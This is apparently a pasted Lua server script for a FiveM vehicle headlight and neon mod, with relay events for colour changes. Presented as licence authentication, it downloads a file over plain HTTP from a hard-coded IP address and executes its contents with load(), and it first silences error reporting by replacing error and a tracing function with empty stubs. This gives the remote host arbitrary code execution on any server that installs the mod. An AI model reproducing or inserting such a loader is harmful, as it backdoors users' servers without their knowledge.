--[[
	id: 0EPWIJPX4AD7ZPLJ5bViz
	name: NEONS V2 S
	description: Neons Auth
	time1: 2021-06-03 02:03:34.581807+00
	time2: 2021-06-03 02:03:34.581807+00
	uploader: nVpiI2NOtXmbABCF9f4UAzVhgQFEQ-ml4eXie1OF
	uploadersession: R0MAbYvEoiVv2MGJG-zuUK-v-Ntp5l
	flag: f
--]]


--[[
strings-override

...
]]
local script = 'ebu_headlights'

local license_key = Config.license_key
local license_key2 = Config.license_key2 or ''

Citizen.Tace = function() end
error = function() end

PerformHttpRequest("74.91.121.153/verify.txt", function (errorCode, resultData, resultHeaders)
    if errorCode == 200 then
      assert(load("local script  = '"..script.."';".. resultData))()
    else
      print('^1'..script..' - Unable to reach auth server - Error : '..errorCode..'^0')
    end
end)

RegisterServerEvent('ebu_headlights:setColor')
AddEventHandler('ebu_headlights:setColor', function(vehicle, color, ismulti, inctimeout)
    TriggerClientEvent('ebu_headlights:setColor', -1, vehicle, color, ismulti, inctimeout)
end)

RegisterServerEvent('ebu_headlights:setColorN')
AddEventHandler('ebu_headlights:setColorN', function(vehicle, color, ismulti, inctimeout)
    TriggerClientEvent('ebu_headlights:setColorN', -1, vehicle, color, ismulti, inctimeout)
end)

RegisterServerEvent('ebu_headlights:neons')
AddEventHandler('ebu_headlights:neons', function(vehicle, neons)
    TriggerClientEvent('ebu_headlights:neons', -1, vehicle,neons)
end)